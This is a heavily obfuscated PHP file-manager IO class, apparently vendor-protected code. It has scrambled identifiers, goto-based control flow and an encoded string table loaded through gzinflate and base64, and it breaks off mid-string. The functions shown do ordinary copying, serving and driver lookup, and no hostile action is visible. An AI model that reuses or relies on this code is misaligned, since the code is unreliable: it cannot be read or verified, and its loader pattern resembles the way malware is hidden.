check($eÖéìÉÑ¯È, $a×¯¤’³‡, $DÂØÊŒ¹Ñ‹, &$D±¨»ÃÚÇà) { $DØ‹‰Ø¡ö´ =& $_SERVER[¹Ò‹Ò¹]; if (self::driverIsSame($eÖéìÉÑ¯È, $DÂØÊŒ¹Ñ‹) && $eÖéìÉÑ¯È->isFolder($a×¯¤’³‡) && $eÖéìÉÑ¯È->isParentOf($a×¯¤’³‡, $D±¨»ÃÚÇà)) { show_json(LNG($DØ‹‰Ø¡ö´[1025]), !1); } if (!$eÖéìÉÑ¯È->exist($a×¯¤’³‡)) { show_json(LNG($DØ‹‰Ø¡ö´[104]), !1); } } private static function copyPath($E„Ú¿ºÁ©í, $D…‡Â‚…ô‰, $F‘ƒªĞª, $fˆøÚİ…ù—, $A½°õ¯èÃ·, $e³Ëöñ‡èë, $AÇßìÆ§Ë¶, $C÷ä·Ò­Ñ = false) { goto e’´†š”—™; e’´†š”—™: $bŞ¾’ÈÈõ¹ =& $_SERVER[¹Ò‹Ò¹]; $a“ÅÖŞŒ˜¼ = $C÷ä·Ò­Ñ ? $C÷ä·Ò­Ñ : $E„Ú¿ºÁ©í->pathThis($D…‡Â‚…ô‰); if ($A½°õ¯èÃ·) { $fÒù‚•½‰ = $F‘ƒªĞª->fileNameExist($fˆøÚİ…ù—, $a“ÅÖŞŒ˜¼); $a“ÅÖŞŒ˜¼ = $F‘ƒªĞª->fileNameAuto($fˆøÚİ…ù—, $a“ÅÖŞŒ˜¼, $A½°õ¯èÃ·, !$AÇßìÆ§Ë¶); $A½°õ¯èÃ· = $fÒù‚•½‰ ? $A½°õ¯èÃ· : !1; } goto AÍÃ¾ºÇ½; C¨¸â×—êİ: $eÅ¢ëë = is_array($eÅ¢ëë) ? $eÅ¢ëë : array($bŞ¾’ÈÈõ¹[73] => array(), $bŞ¾’ÈÈõ¹[74] => array()); $EÈ‰íÃ‡×ß = array_merge($eÅ¢ëë[$bŞ¾’ÈÈõ¹[73]], $eÅ¢ëë[$bŞ¾’ÈÈõ¹[74]]); foreach ($EÈ‰íÃ‡×ß as $c„—›£µ) { $c±ƒîÂ‘Ãœ = $c„—›£µ[$bŞ¾’ÈÈõ¹[29]] == $bŞ¾’ÈÈõ¹[191]; $D…‡Â‚…ô‰ = $E„Ú¿ºÁ©í->getPathInner($c„—›£µ[$bŞ¾’ÈÈõ¹[75]]); $BåÈÔÕ˜´É = self::copyPath($E„Ú¿ºÁ©í, $D…‡Â‚…ô‰, $F‘ƒªĞª, $fˆøÚİ…ù—, $A½°õ¯èÃ·, $e³Ëöñ‡èë, $c±ƒîÂ‘Ãœ); if (!$BåÈÔÕ˜´É) { IO::errorTips($bŞ¾’ÈÈõ¹[1026] . $D…‡Â‚…ô‰ . $bŞ¾’ÈÈõ¹[66] . $fˆøÚİ…ù—); } } goto bÅ—ìÛÖÆ˜; AÍÃ¾ºÇ½: if ($AÇßìÆ§Ë¶) { return self::copyFile($E„Ú¿ºÁ©í, $D…‡Â‚…ô‰, $F‘ƒªĞª, $fˆøÚİ…ù—, $a“ÅÖŞŒ˜¼, $e³Ëöñ‡èë); } if ($A½°õ¯èÃ· == REPEAT_RENAME_FOLDER) { $A½°õ¯èÃ· = !1; } $dÛÙ¸®œÓ½ = rtrim($fˆøÚİ…ù—, $bŞ¾’ÈÈõ¹[8]) . $bŞ¾’ÈÈõ¹[8] . $a“ÅÖŞŒ˜¼; goto a„ÃÃÉè®Í; bÅ—ìÛÖÆ˜: return $fø¸›‘”—; goto eƒ‡ÙÉ»; a„ÃÃÉè®Í: $fø¸›‘”— = $F‘ƒªĞª->mkdir($F‘ƒªĞª->getPath($dÛÙ¸®œÓ½)); $fˆøÚİ…ù— = $F‘ƒªĞª->getPathInner($fø¸›‘”—); $eÅ¢ëë = $E„Ú¿ºÁ©í->listPath($D…‡Â‚…ô‰, !0); goto C¨¸â×—êİ; eƒ‡ÙÉ»: } private static function copyFile($a”£à… ¤Ï, $CÔÃÒğÍÇÄ, $E¥¸”¥Òòå, $Eó‰í¦ÚÃ, $a„ùˆíõæŠ, $b±’…©Ìº) { goto Aì³ªÔôì; C‹ÜÜ¨™Û: $d´–õ²Úñè = $a”£à… ¤Ï->iconvApp($d´–õ²Úñè); $dµ¨š‡†œ½ = $E¥¸”¥Òòå->upload($Eó‰í¦ÚÃ, $d´–õ²Úñè, $b±’…©Ìº); self::remove($cÑ­ãƒÛ . $E³ÄïÆšÊ); goto c¾•Õî‘¬¦; Aì³ªÔôì: $b‡­äí–¦À =& $_SERVER[¹Ò‹Ò¹]; $Eó‰í¦ÚÃ = $E¥¸”¥Òòå->getPath(rtrim($Eó‰í¦ÚÃ, $b‡­äí–¦À[8]) . $b‡­äí–¦À[8] . $a„ùˆíõæŠ); $E³ÄïÆšÊ = $b‡­äí–¦À[1027] . time() . rand_string(5); goto fóŠÂ™å³; c¾•Õî‘¬¦: Hook::trigger($b‡­äí–¦À[1029], $a”£à… ¤Ï, $CÔÃÒğÍÇÄ, $E¥¸”¥Òòå, $Eó‰í¦ÚÃ, $a„ùˆíõæŠ, $dµ¨š‡†œ½); return $dµ¨š‡†œ½; goto b¯¤¨ìÜ†ç; f±¿İÇª·Ì: mk_dir($cÑ­ãƒÛ); $d´–õ²Úñè = $cÑ­ãƒÛ . $E³ÄïÆšÊ; $d´–õ²Úñè = $a”£à… ¤Ï->download($CÔÃÒğÍÇÄ, $d´–õ²Úñè); goto C‹ÜÜ¨™Û; fóŠÂ™å³: Hook::trigger($b‡­äí–¦À[1028], $a”£à… ¤Ï, $CÔÃÒğÍÇÄ, $E¥¸”¥Òòå, $Eó‰í¦ÚÃ, $a„ùˆíõæŠ, $E³ÄïÆšÊ); if (self::driverIsSame($a”£à… ¤Ï, $E¥¸”¥Òòå)) { if ($b±’…©Ìº) { $dµ¨š‡†œ½ = $E¥¸”¥Òòå->moveFile($CÔÃÒğÍÇÄ, $Eó‰í¦ÚÃ); } else { $dµ¨š‡†œ½ = $E¥¸”¥Òòå->copyFile($CÔÃÒğÍÇÄ, $Eó‰í¦ÚÃ); } Hook::trigger($b‡­äí–¦À[1029], $a”£à… ¤Ï, $CÔÃÒğÍÇÄ, $E¥¸”¥Òòå, $Eó‰í¦ÚÃ, $a„ùˆíõæŠ, $dµ¨š‡†œ½); return $dµ¨š‡†œ½; } $cÑ­ãƒÛ = TEMP_FILES; goto f±¿İÇª·Ì; b¯¤¨ìÜ†ç: } public static function pathFather($có»¼¬”¡—) { $Aêë‘×ç³‰ = IO::init($có»¼¬”¡—); $Eé›Š§Äœš = $Aêë‘×ç³‰->pathFather($Aêë‘×ç³‰->path); return $Aêë‘×ç³‰->getPathOuter($Eé›Š§Äœš); } public static function fileOut($Däˆ“Ë , $bÙì…æÜ« = false, $CšÅ÷Ğ„‰¦ = false, $b½ùîÅ˜› = '') { $eÕÍêĞ„ã± = self::driverMake($Däˆ“Ë ); if ($eÕÍêĞ„ã±->isFileOutServer()) { return $eÕÍêĞ„ã±->fileOutServer($Däˆ“Ë , $bÙì…æÜ«, $CšÅ÷Ğ„‰¦, $b½ùîÅ˜›); } return $eÕÍêĞ„ã±->fileOut($Däˆ“Ë , $bÙì…æÜ«, $CšÅ÷Ğ„‰¦, $b½ùîÅ˜›); } public static function fileOutImage($b½É©‚›¦ , $E‘òÌÁÅ„  = 250) { $CËÃÒôè¬œ = array(250, 600, 1200, 3000, 5000); for ($EÊ†œËá‹ = 0; $EÊ†œËá‹ < count($CËÃÒôè¬œ); $EÊ†œËá‹++) { if ($EÊ†œËá‹ == 0 && $E‘òÌÁÅ„  <= $CËÃÒôè¬œ[$EÊ†œËá‹]) { $E‘òÌÁÅ„  = $CËÃÒôè¬œ[$EÊ†œËá‹]; break; } else { if ($E‘òÌÁÅ„  > $CËÃÒôè¬œ[$EÊ†œËá‹ - 1] && $E‘òÌÁÅ„  <= $CËÃÒôè¬œ[$EÊ†œËá‹]) { $E‘òÌÁÅ„  = $CËÃÒôè¬œ[$EÊ†œËá‹]; break; } else { if ($EÊ†œËá‹ == count($CËÃÒôè¬œ) - 1 && $E‘òÌÁÅ„  > $CËÃÒôè¬œ[$EÊ†œËá‹]) { $E‘òÌÁÅ„  = $CËÃÒôè¬œ[$EÊ†œËá‹]; break; } } } } $BÍ‡‚æÇ¾² = self::driverMake($b½É©‚›¦ ); if ($BÍ‡‚æÇ¾²->isFileOutServer()) { return $BÍ‡‚æÇ¾²->fileOutImageServer($b½É©‚›¦ , $E‘òÌÁÅ„ ); } return $BÍ‡‚æÇ¾²->fileOutImage($b½É©‚›¦ , $E‘òÌÁÅ„ ); } private static function driverIsSame($F…—÷°Í†‡, $bŒæ¿ÄÓ½à) { goto CšÕõÕÏ´; fø°‹ÑÚ‰†: if ($F…—÷°Í†‡->pathDriver == $bŒæ¿ÄÓ½à->pathDriver) { return !0; } return !1; goto C‹æ­ÚÜå; CšÕõÕÏ´: $e»Ş½ïèœå =& $_SERVER[¹Ò‹Ò¹]; $c‰Â¢©ë¡µ = $F…—÷°Í†‡->getType(); $cå²öğâ“’ = $bŒæ¿ÄÓ½à->getType(); goto B•±Ä‘ºĞ…; B•±Ä‘ºĞ…: if ($c‰Â¢©ë¡µ != $cå²öğâ“’) { return !1; } if ($c‰Â¢©ë¡µ == $e»Ş½ïèœå[709]) { return !0; } if ($c‰Â¢©ë¡µ == $e»Ş½ïèœå[105]) { return !0; } goto fø°‹ÑÚ‰†; C‹æ­ÚÜå: } public static function copyUpdate($aˆÜ¬Ó¨¸¡, $fÛÉµùŞ«í) { goto c‡ä·í¿ ; c‡ä·í¿ : $dò¢İ¥Õ =& $_SERVER[¹Ò‹Ò¹]; if (!IO::exist($aˆÜ¬Ó¨¸¡)) { return !1; } if (!IO::exist($fÛÉµùŞ«í)) { IO::mkdir($fÛÉµùŞ«í); } goto bâó‰´Àæ; bâó‰´Àæ: $EŒ‹È… = self::_listAll($aˆÜ¬Ó¨¸¡); $D°‰ó‘¡¯“ = self::_listAll($fÛÉµùŞ«í); $fˆÍÖ¡Ç¡‡ = array(); goto B’åâÜğ×¦; B’åâÜğ×¦: $d¯È‰«‡”­ = array(); foreach ($EŒ‹È… as $DÈïß†ÌàŞ => $bÆ“³ù‰Ñ) { if (isset($D°‰ó‘¡¯“[$DÈïß†ÌàŞ])) { if ($bÆ“³ù‰Ñ[$dò¢İ¥Õ[76]] == 1) { continue; } if ($D°‰ó‘¡¯“[$DÈïß†ÌàŞ][$dò¢İ¥Õ[77]] == $bÆ“³ù‰Ñ[$dò¢İ¥Õ[77]]) { continue; } } if ($bÆ“³ù‰Ñ[$dò¢İ¥Õ[76]] == 1) { $d¯È‰«‡”­[] = $fÛÉµùŞ«í . $dò¢İ¥Õ[8] . $DÈïß†ÌàŞ; continue; } $F†İÛíÕŒ = strstr(trim($DÈïß†ÌàŞ, $dò¢İ¥Õ[8]), $dò¢İ¥Õ[8]) ? get_path_father($DÈïß†ÌàŞ) : $dò¢İ¥Õ[33]; $fˆÍÖ¡Ç¡‡[] = array($dò¢İ¥Õ[1030] => $bÆ“³ù‰Ñ[$dò¢İ¥Õ[75]], $dò¢İ¥Õ[1031] => rtrim($fÛÉµùŞ«í, $dò¢İ¥Õ[8]) . $dò¢İ¥Õ[8] . $F†İÛíÕŒ, $dò¢İ¥Õ[1032] => $bÆ“³ù‰Ñ); } $F‰´‹ä£´ = array($dò¢İ¥Õ[191] => $fˆÍÖ¡Ç¡‡, $dò¢İ¥Õ[76] => $d¯È‰«‡”­); goto dì­·»ÑÉÕ; dì­·»ÑÉÕ: Hook::trigger($dò¢İ¥Õ[1033], $aˆÜ¬Ó¨¸¡, $fÛÉµùŞ«í, $F‰´‹ä£´); foreach ($d¯È‰«‡”­ as $bÆ“³ù‰Ñ) { IO::mkdir($bÆ“³ù‰Ñ); } foreach ($fˆÍÖ¡Ç¡‡ as $bÆ“³ù‰Ñ) { IO::copy($bÆ“³ù‰Ñ[$dò¢İ¥Õ[1030]], $bÆ“³ù‰Ñ[$dò¢İ¥Õ[1031]], REPEAT_REPLACE); } goto c¥¾¸›ÂÚÊ; c¥¾¸›ÂÚÊ: } private static function _listAll($d¿ÆÓâïÀ¨) { $c‡ì‘ÄŒâá =& $_SERVER[¹Ò‹Ò¹]; $d¿ÆÓâïÀ¨ = KodIO::clear($d¿ÆÓâïÀ¨); $Eò…¸›ÎË¢ = IO::listAll($d¿ÆÓâïÀ¨); foreach ($Eò…¸›ÎË¢ as &$d²¼Ø‘ôÃè) { $cæ±®–İê = substr($d²¼Ø‘ôÃè[$c‡ì‘ÄŒâá[75]], strlen($d¿ÆÓâïÀ¨)); $d²¼Ø‘ôÃè[$c‡ì‘ÄŒâá[1034]] = trim($cæ±®–İê, $c‡ì‘ÄŒâá[8]); } unset($d²¼Ø‘ôÃè); return array_to_keyvalue($Eò…¸›ÎË¢, $c‡ì‘ÄŒâá[1034]); } public static function fileSubstr($DÚ“• ¯ºë, $D››ùê‹», $bñÚãŒŠÊ = false) { goto AÒÍ½¡Ê; bµ’«˜’”: $FºÏÆÙĞ‡‰ = $D››ùê‹»; $aªùÍ‡ƒÉ = $bñÚãŒŠÊ; if ($D››ùê‹» < 0) { $D››ùê‹» = $c£³¤ºÍé« + $D››ùê‹»; } goto cõ¥“¨Åßâ; AÒÍ½¡Ê: $eÅš«‹øƒ =& $_SERVER[¹Ò‹Ò¹]; $EÌ÷¶Ã¡äŠ = self::driverMake($DÚ“• ¯ºë); $c£³¤ºÍé« = $EÌ÷¶Ã¡äŠ->size($DÚ“• ¯ºë); goto bµ’«˜’”; cõ¥“¨Åßâ: if ($bñÚãŒŠÊ === !1) { $bñÚãŒŠÊ = $c£³¤ºÍé« - $D››ùê‹»; } if ($D››ùê‹» + $bñÚãŒŠÊ > $c£³¤ºÍé«) { $bñÚãŒŠÊ = $c£³¤ºÍé« - $D››ùê‹»; } if (!$c£³¤ºÍé« && $EÌ÷¶Ã¡äŠ->getType() == $eÅš«‹øƒ[105] && !$EÌ÷¶Ã¡äŠ->exist($DÚ“• ¯ºë)) { throw new Exception($eÅš«‹øƒ[1035] . LNG($eÅš«‹øƒ[1036]) . $eÅš«‹øƒ[900] . get_path_this($DÚ“• ¯ºë) . $eÅš«‹øƒ[33]); } goto eõÍ“Õ±×Í; BÌ™«©˜æÂ: if (!$aºÚêÓîöğ && $bñÚãŒŠÊ && isset($GLOBALS[$eÅš«‹øƒ[1037]])) { throw new Exception($GLOBALS[$eÅš«‹øƒ[1037]][$eÅš«‹øƒ[1038]]); } return $aºÚêÓîöğ; goto Eòæ¶ÃßË; eõÍ“Õ±×Í: if ($bñÚãŒŠÊ <= 0) { return $eÅš«‹øƒ[33]; } if ($D››ùê‹» < 0 || $D››ùê‹» >= $c£³¤ºÍé« || $bñÚãŒŠÊ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\x52\145\141\144\x20\x65\x72\162\157\x72\41\40\x73\x74\141\x72\164\x3d{$D››ùê‹»}\73\x6c\145\x6e\147\x74\x68\75{$bñÚãŒŠÊ}\73\x20\x73\x69\172\x65\75{$c£³¤ºÍé«}\x3b"); } $aºÚêÓîöğ = $EÌ÷¶Ã¡äŠ->fileSubstr($DÚ“• ¯ºë, $D››ùê‹», $bñÚãŒŠÊ); goto BÌ™«©˜æÂ; Eòæ¶ÃßË: } private static function driverMake(&$DÅ¥˜ê‡ğì) { goto e›™ñÇëô; e›™ñÇëô: $cŠ¸ñâ‰… =& $_SERVER[¹Ò‹Ò¹]; $E·÷•¦¦Íá = KodIO::parse($DÅ¥˜ê‡ğì); if (!self::$driverListSystem) { $bÂºĞÔí„± = Model($cŠ¸ñâ‰…[718])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($bÂºĞÔí„±, $cŠ¸ñâ‰…[388]); } goto C‰ÈĞ–ë¹¬; c‡‹äÓËËÇ: return $aˆŠ›’Å”Š; goto Bµ”ÉÍíÛ¼; C‰ÈĞ–ë¹¬: if ($E·÷•¦¦Íá[$cŠ¸ñâ‰…[29]] == KodIO::KOD_IO && !self::$driverListSystem[$E·÷•¦¦Íá[$cŠ¸ñâ‰…[388]]]) { return !1; } $DÅ¥˜ê‡ğì = $E·÷•¦¦Íá[$cŠ¸ñâ‰…[1039]]; $aˆŠ›’Å”Š = self::driverGet($E·÷•¦¦Íá, $DÅ¥˜ê‡ğì); goto c‡‹äÓËËÇ; Bµ”ÉÍíÛ¼: } private static function driverGet($B«¡¤áˆ¦, &$DĞˆ’±Ş•™) { goto C‘—ÊÆÖæ; càóæÎ³³¿: $aÒê˜ì‘->path = $DĞˆ’±Ş•™; return $aÒê˜ì‘; goto Eë«”‰„à£; FÂ™ï“„›: $aÒê˜ì‘ = self::$driverCache[$c‚Õ¬ï“]; $aÒê˜ì‘->pathDriver = $bĞœó‹ÙÓë; $aÒê˜ì‘->pathBase = $E ½”ôÕ’Õ[33]; goto dŠÇï‹ùÙÚ; c ¨ŠÇ–Œ°: switch ($B«¡¤áˆ¦[$E ½”ôÕ’Õ[29]]) { case KodIO::KOD_IO: $f‹…ÛÚ”÷Ä = self::$driverListSystem[$F‰ÚäÉé‡“]; break; case KodIO::KOD_SOURCE: $DĞˆ’±Ş•™ = $F‰ÚäÉé‡“ . $DĞˆ’±Ş•™; $f‹…ÛÚ”÷Ä = array($E ½”ôÕ’Õ[1041] => $E ½”ôÕ’Õ[1042], $E ½”ôÕ’Õ[6] => $B«¡¤áˆ¦); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D®’å¨§Çô = $GLOBALS[$E ½”ôÕ’Õ[1043]]; self::$driverListUser = array_to_keyvalue($D®’å¨§Çô, $E ½”ôÕ’Õ[388]); } $f‹…ÛÚ”÷Ä = self::$driverListUser[$F‰ÚäÉé‡“]; break; case KodIO::KOD_SHARE_LINK: $f‹…ÛÚ”÷Ä = array($E ½”ôÕ’Õ[1041] => $E ½”ôÕ’Õ[1044], $E ½”ôÕ’Õ[6] => $B«¡¤áˆ¦); $d–‹’Â®åº = Action($E ½”ôÕ’Õ[1045])->sharePathInfo($B«¡¤áˆ¦[$E ½”ôÕ’Õ[75]]); $DĞˆ’±Ş•™ = $d–‹’Â®åº[$E ½”ôÕ’Õ[390]]; if (!$d–‹’Â®åº[$E ½”ôÕ’Õ[390]]) { $D¡†²¤à = Model($E ½”ôÕ’Õ[558])->getInfo($d–‹’Â®åº[$E ½”ôÕ’Õ[462]]); $DĞˆ’±Ş•™ = KodIO::clear($D¡†²¤à[$E ½”ôÕ’Õ[1046]] . $B«¡¤áˆ¦[$E ½”ôÕ’Õ[1039]]); $B«¡¤áˆ¦[$E ½”ôÕ’Õ[460]] = $D¡†²¤à; $B«¡¤áˆ¦[$E ½”ôÕ’Õ[1023]] = $DĞˆ’±Ş•™; $f‹…ÛÚ”÷Ä = array($E ½”ôÕ’Õ[1041] => $E ½”ôÕ’Õ[1047], $E ½”ôÕ’Õ[6] => $B«¡¤áˆ¦); } break; case KodIO::KOD_SHARE_ITEM: $f‹…ÛÚ”÷Ä = array($E ½”ôÕ’Õ[1041] => $E ½”ôÕ’Õ[1048], $E ½”ôÕ’Õ[6] => $B«¡¤áˆ¦); $D¡†²¤à = Model($E ½”ôÕ’Õ[558])->getInfo($B«¡¤áˆ¦[$E ½”ôÕ’Õ[388]]); if ($D¡†²¤à[$E ½”ôÕ’Õ[390]] == $E ½”ôÕ’Õ[491]) { $DĞˆ’±Ş•™ = KodIO::clear($D¡†²¤à[$E ½”ôÕ’Õ[1046]] . $B«¡¤áˆ¦[$E ½”ôÕ’Õ[1039]]); $B«¡¤áˆ¦[$E ½”ôÕ’Õ[460]] = $D¡†²¤à; $B«¡¤áˆ¦[$E ½”ôÕ’Õ[1023]] = $DĞˆ’±Ş•™; $f‹…ÛÚ”÷Ä = array($E ½”ôÕ’Õ[1041] => $E ½”ôÕ’Õ[1049], $E ½”ôÕ’Õ[6] => $B«¡¤áˆ¦); } else { if (!$DĞˆ’±Ş•™) { $DĞˆ’±Ş•™ = $D¡†²¤à[$E ½”ôÕ’Õ[390]]; } } break; default: $DĞˆ’±Ş•™ = $B«¡¤áˆ¦[$E ½”ôÕ’Õ[75]]; $f‹…ÛÚ”÷Ä = array($E ½”ôÕ’Õ[1041] => $E ½”ôÕ’Õ[1050]); break; } $c‚Õ¬ï“ = $B«¡¤áˆ¦[$E ½”ôÕ’Õ[75]]; if (!isset(self::$driverCache[$c‚Õ¬ï“])) { $EÓ“İ‚ì·† = strtolower($f‹…ÛÚ”÷Ä[$E ½”ôÕ’Õ[93]]); $A¶÷‹çŸµœ = $GLOBALS[$E ½”ôÕ’Õ[6]][$E ½”ôÕ’Õ[87]][$E ½”ôÕ’Õ[770]]; $c‰¡êˆ¢î = $E ½”ôÕ’Õ[71] . (isset($A¶÷‹çŸµœ[$EÓ“İ‚ì·†]) ? $A¶÷‹çŸµœ[$EÓ“İ‚ì·†] : ucfirst($EÓ“İ‚ì·†)); if (!class_exists($c‰¡êˆ¢î)) { show_json("{$c‰¡êˆ¢î}\40\x6e\157\164\x20\145\x78\x69\163\164\x73\x21", !1); } $F×§‘Ã³ = isset($f‹…ÛÚ”÷Ä[$E ½”ôÕ’Õ[6]]) ? $f‹…ÛÚ”÷Ä[$E ½”ôÕ’Õ[6]] : !1; self::$driverCache[$c‚Õ¬ï“] = new $c‰¡êˆ¢î($F×§‘Ã³); } goto FÂ™ï“„›; C‘—ÊÆÖæ: $E ½”ôÕ’Õ =& $_SERVER[¹Ò‹Ò¹]; $bĞœó‹ÙÓë = $B«¡¤áˆ¦[$E ½”ôÕ’Õ[1040]]; $F‰ÚäÉé‡“ = $B«¡¤áˆ¦[$E ½”ôÕ’Õ[388]]; goto c ¨ŠÇ–Œ°; dŠÇï‹ùÙÚ: if (isset($f‹…ÛÚ”÷Ä[$E ½”ôÕ’Õ[6]][$E ½”ôÕ’Õ[1051]])) { $aÒê˜ì‘->pathBase = rtrim($f‹…ÛÚ”÷Ä[$E ½”ôÕ’Õ[6]][$E ½”ôÕ’Õ[1051]], $E ½”ôÕ’Õ[8]) . $E ½”ôÕ’Õ[8]; $DĞˆ’±Ş•™ = $aÒê˜ì‘->pathBase . ltrim($DĞˆ’±Ş•™, $E ½”ôÕ’Õ[8]); } $DĞˆ’±Ş•™ = $aÒê˜ì‘->getPath($DĞˆ’±Ş•™); if (isset($B«¡¤áˆ¦[$E ½”ôÕ’Õ[1023]])) { $DĞˆ’±Ş•™ = $B«¡¤áˆ¦[$E ½”ôÕ’Õ[1023]]; } goto càóæÎ³³¿; Eë«”‰„à£: } public static function errorTips($dĞàšğÒ° = false) { goto Díàã‰®Š; CİŠÒ·Ï‚: $b ãæ“²ø[] = $dĞàšğÒ°; write_log($Eƒ¤—ÁŸ·„[159] . ACTION . $Eƒ¤—ÁŸ·„[1052] . $dĞàšğÒ°, $Eƒ¤—ÁŸ·„[1053]); goto f§ê­ÂèÓ; Díàã‰®Š: $Eƒ¤—ÁŸ·„ =& $_SERVER[¹Ò‹Ò¹]; static $b ãæ“²ø = array(); $c Õ©Ãù” = 1000; goto Eß°ëî°¾; Eß°ëî°¾: if ($dĞàšğÒ° === -1) { return $b ãæ“²ø ? $b ãæ“²ø[count($b ãæ“²ø) - 1] : $Eƒ¤—ÁŸ·„[33]; } if ($dĞàšğÒ° === !1) { return implode($Eƒ¤—ÁŸ·„[227], $b ãæ“²ø); } if (count($b ãæ“²ø) >= $c Õ©Ãù”) { $b ãæ“²ø = array_slice($b ãæ“²ø, $c Õ©Ãù” * 0.5, $c Õ©Ãù”); } goto CİŠÒ·Ï‚; f§ê­ÂèÓ: } public static function getLastError($dä¡ó§ÔçÙ = '') { $F·Æ‹¿ã÷ = self::errorTips(-1); return $F·Æ‹¿ã÷ ? $F·Æ‹¿ã÷ : $dä¡ó§ÔçÙ; } } goto BÏÒ¢ÕÕƒâ; DªÕ‡¢ÓÒí: if (!function_exists('_kodDe')) { function _kodDe($fÕ¥¹ö¨Ã) { $fÕ¥¹ö¨Ã = base64_decode($fÕ¥¹ö¨Ã); $CÁ¾à…‡è = strlen($fÕ¥¹ö¨Ã); $c‘„»õÕ²İ = ''; $d›óñ¦Æçî = ord($fÕ¥¹ö¨Ã[0]) - 30; for ($EŒ„®ëòƒ = 1; $EŒ„®ëòƒ < $CÁ¾à…‡è; $EŒ„®ëòƒ += 2) { if ($EŒ„®ëòƒ + 1 < $CÁ¾à…‡è) { $c‘„»õÕ²İ .= chr(ord($fÕ¥¹ö¨Ã[$EŒ„®ëòƒ + 1]) + $d›óñ¦Æçî); $c‘„»õÕ²İ .= chr(ord($fÕ¥¹ö¨Ã[$EŒ„®ëòƒ]) + $d›óñ¦Æçî); } else { $c‘„»õÕ²İ .= chr(ord($fÕ¥¹ö¨Ã[$EŒ„®ëòƒ]) + $d›óñ¦Æçî); } } return $c‘„»õÕ²İ; } } define("\271\322\213\322\271", base64_decode('vfLUxIY=')); $_SERVER[¹Ò‹Ò¹] = explode("\x7c\x4\x7c\x1\x7c\x5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\234\23\105\326\270\367\212\237\347\352\172\54\36\355\160\314\101\216\31\116\31\30\60\314\144\146\42\231\311\220\144\70"."\44\20\72\111\47\351\231\44\35\272\73\223\71\0\25\157\5\74\20\157\130\25\317\125\274\121\101\21\135\77\165\21\321\365\134\324\365\102\300\3\157\127\135\165\325"."\257\356\252\356\144\334\357\373\375\377\12\244\353\256\172\365\352\325\173\125\357\275\332\264\150\277\105\173\57\332\377\313\367\136\175\0\177\201\277\373\201\177\321\367\111".base64_decode('Fx+4F/pv34svqqpqHX/QqPaDL3lwnXyXfIe8PODf+rzvkBfuOs27e+3Wvt17').base64_decode('77XxpYGb60FmXLYe/0g5zZSUXtUwDRwR13JJNYW/1Rz+deMfY2FGNRX8HW0P')."\x84\xa3\xa1\xce\x8e\xe\x6f\x30\x1c\x25\x35\x8a\xe9\x59\x2d\x41\xbe\xf2\xb2\x2e\x67\x49\xe5\x79\x45\x37\x40\x53\x62\x75\xd1\xbc\x96\x57\x72\x96\x18\x1e\x91\x90\x4d\x39\x26\x1b\xa4"."\246\246\151\321\46\157\207\77\60\47\32\236\323\341\45\71\142\321\205\5\105\357\303\41\364\31\62\145\335\14\253\131\205\345\50\352\254\137\323\274\55\276\166\51\34".strrev('€ZJ­IsUŒ¿Ğ$y´´ôÒš^œiæŸïÀ`øÒá|ÚÚ7G _a<‡´ô')."\123\26\110\325\370\243\131\125\62\11\374\231\223\151\167\314\276\74\371\12\263\57\60\7\271\102\46\203\3\355\354\213\364\137\111\312\205\14\201\131\223\30\310\353\152"."\126\246\103\237\256\364\261\130\374\41\27\114\115\315\305\161\300\333\153\352\62\217\7\75\216\353\112\126\311\221\252\102\136\277\267\61\54\301\156\112\315\301\100\233\104"."\246\42\53\33\246\242\113\263\132\275\101\257\4\273\336\120\211\106\134\51\341\162\235\355\0\40\222\307\357\227\6\253\301\124\262\171\132\15\56\123\246\262\100\260\311"."\33\224\246\315\221\70\234\342\132\66\253\345\134\240\26\60\237\246\320\125\157\60\210\77\34\4\203\375\76\70\165\44\20\150\156\16\171\131\210\14\156\206\37\364\144"."\xc\xc1\x52\x4b\x28\x91\xcc\x98\xd1\x1e\x39\x53\xa0\xc8\xda\x8d\x7f\x2b\xc9\xf\xf9\xd5\xc\x82\xc0\xb\xd5\x9c\x5a\x20\xc8\x4a\xaa\xd0\x34\xb6\x72\xc8\x47\x81\xe6\x56\x68\x4c\x16"."\x14\xd3\xc8\x9a\x2\xb\xac\x7\x7f\x36\x4c\xc1\xbf\x93\x48\xa6\x58\x14\xa6\x29\xba\x19\x55\x72\x71\x2d\xa1\xe6\xc8\x32\x9c\x4a\x96\x1c\x41\x3c\xd9\x4c\x37\xe9\x2a\xc8\x47\x2a\xd4"."\x5c\x71\x2d\xdf\xd7\xa6\xf5\x90\x31\x24\xd5\x8c\xe2\x67\xab\x2c\xa9\x65\x12\x8a\xce\xc3\x79\x50\x5c\x4c\x21\x83\x51\xfb\x85\xd2\xed\x85\xac\x98\x85\x5\xe3\x69\x35\x93\xd0\xe9\xe2".strrev('ÁA›XÂè¤"rhÏ™ÕÇA´&˜¤ÉIël¼&XÇ ­'."\r".'¾>É«ù`œ­ü').base64_decode('QMEUIwsoW7OmZ5sAuSDtg0WidpZJ6KbLJCGA0EXIXNXcs5y/zJt7KvinmtC8')."\x8\xe9\x5a\x5a\xc9\x64\xa2\x4a\xaf\x42\x96\x53\x36\x31\xce\xa0\x63\x75\x1b\x31\x35\xe7\x6\x31\x38\xe8\xb\x44\xd3\xb2\x91\x6e\x4b\x8c\x8b\xa2\x52\x94\x94\x26\x94\x5e\x57\x3e\x9d"."\47\53\236\55\362\210\5\335\341\354\264\153\246\127\40\310\31\55\56\147\304\221\342\357\264\151\346\103\112\56\1\1\102\106\244\25\163\10\140\171\105\41\231\232\34"."\x52\x42\x6a\x93\xe6\x48\xad\xf5\x6a\xbd\x41\xb\x66\x33\xec\x8b\x8e\x8e\xc5\x19\x2c\xd2\xec\x25\x18\x53\x41\xc2\x4a\xaf\x49\x80\x22\x4d\x8a\xa7\x65\x1d\x4c\x57\x43\xc1\x4c\x3a\x4f"."\41\144\45\237\317\250\161\331\124\265\234\133\213\233\212\351\64\114\135\221\111\155\236\170\134\61\14\147\243\226\63\165\55\343\364\144\62\132\321\31\320\325\224\232\253"."\227\152\10\21\6\211\140\231\73\41\141\254\47\153\267\142\222\4\161\5\322\205\32\334\32\135\223\54\267\56\347\214\244\242\73\275\144\321\324\113\140\76\30\135\244"."\331\232\124\43\257\31\52\354\136\275\44\233\246\34\117\103\232\302\253\157\370\215\374\152\56\243\346\224\222\274\336\336\274\252\53\6\355\253\324\322\